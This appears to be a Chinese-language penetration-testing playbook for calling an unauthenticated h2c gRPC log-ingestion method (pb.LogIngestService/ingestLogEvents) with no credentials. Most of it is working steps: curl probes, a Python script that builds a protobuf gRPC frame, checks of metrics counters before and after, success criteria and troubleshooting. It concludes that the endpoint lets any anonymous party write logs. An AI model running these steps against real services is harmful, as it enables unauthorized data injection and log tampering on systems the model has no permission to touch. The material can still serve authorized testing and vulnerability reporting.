# h2c gRPC 日志摄取接口未授权调用

## 适用面 / 前置
- 目标端口为**无 TLS 的 h2c gRPC**（HTTP/2 prior knowledge，明文 http://）。
- 需先离线拿到 proto（前端 bundle、镜像、grpc 反射、历史文件）。本例 schema 取自离线 proto：
  - `pb.LogIngestService/ingestLogEvents`
  - 请求顶层：`field 3 = ownerUserId`（varint）、`field 4 = event`（message）
  - event：`field 1 = eventId`（string）、`field 3 = logFamily`（varint）、`field 4 = schemaVersion`（string）
- 关键点：**不要带任何 metadata / authorization**。带了反而容易掩盖"根本没鉴权"这一事实。

## 步骤

```bash
TARGET=192.0.2.15:18081
METRICS=http://192.0.2.15:18082/metrics

# 0) 确认是 gRPC 且支持 h2c（应看到 grpc-status 或 HTTP/2 帧，而不是 400/404 HTML）
curl -V | grep -i http2
curl -s -o /dev/null -D - --http2-prior-knowledge http://$TARGET/

# 1) 空体探针：无鉴权会直接落到业务参数校验
printf '' | curl -s --http2-prior-knowledge \
  -H 'content-type: application/grpc' -H 'te: trailers' \
  --data-binary @- http://$TARGET/pb.LogIngestService/ingestLogEvents -D -
#    期望 -> grpc-status: 2 / grpc-message: invalid ingest request: ownerUserId is required

# 2) 记计数器基线
curl -s $METRICS | grep -E 'log_ingest_(grpc_requests|events_received|events_rejected|events_accepted|kafka_write_errors)_total'

# 3) 构造最小合法帧：protobuf {3:1, 4:{1:"e2", 3:1, 4:"v1"}}
python3 - <<'EOF' > /tmp/req.bin
import struct, sys
def varint(n):
    out = b''
    while True:
        b = n & 0x7f; n >>= 7
        out += bytes([b | 0x80]) if n else bytes([b])
        if not n: return out
def ld(f, p): return varint(f << 3 | 2) + varint(len(p)) + p
def v(f, n):  return varint(f << 3 | 0) + varint(n)
event = ld(1, b'e2') + v(3, 1) + ld(4, b'v1')
msg   = v(3, 1) + ld(4, event)
sys.stdout.buffer.write(b'\x00' + struct.pack('>I', len(msg)) + msg)  # 00 = 不压缩, 4字节大端长度
EOF

curl -s --http2-prior-knowledge \
  -H 'content-type: application/grpc' -H 'te: trailers' \
  --data-binary @/tmp/req.bin http://$TARGET/pb.LogIngestService/ingestLogEvents -D -

# 4) 再读计数器对比
curl -s $METRICS | grep -E 'log_ingest_(grpc_requests|events_received|events_rejected|events_accepted|kafka_write_errors)_total'
```

## 判据
- 空体即返回 `grpc-status: 2` + `invalid ingest request: ownerUserId is required` ⇒ 鉴权不存在，参数校验先于权限（注意别把它当"报错=不可用"）。
- 合法帧通过全部业务校验，**即使后端依赖挂了**也会返回 `publish failed: dial tcp: lookup kafka ... no such host`，说明已进入处理器 → 发布路径。
- 硬旁证：`log_ingest_grpc_requests_total`、`log_ingest_events_received_total`、`log_ingest_kafka_write_errors_total` 在请求前后同步递增；`log_ingest_events_rejected_total` 对空体递增。
- `log_ingest_events_accepted_total > 0` 才算真正写库成功。本目标上长期为 0，纯属 Kafka 依赖故障（容器内 DNS 127.0.0.11:53 解析不到主机名 `kafka`），Kafka 恢复后该口即为**任意匿名方日志写入口**。

## 失败常见原因
- 用了 `https://` 或走了 http 代理 → 握手失败/降级。h2c 必须 `--http2-prior-knowledge` 且不走代理。
- `content-type` 不是 `application/grpc` → 415 / HTML 错误页。
- 帧长度与内容不符（长度前缀是"后面 payload 的字节数"，含 5 字节外的实际长度；`0x0d`/`0x09` 少 1 字节的写法部分实现能容忍，部分直接报 Internal）→ 用上面的脚本生成，别手抄。
- 方法名大小写/包名不符 → `grpc-status: 12` UNIMPLEMENTED（说明路径错，不是鉴权拦）。
- 只要看到 `publish failed` 就说明打得通，别因没拿到 200/OK 而误判为失败。
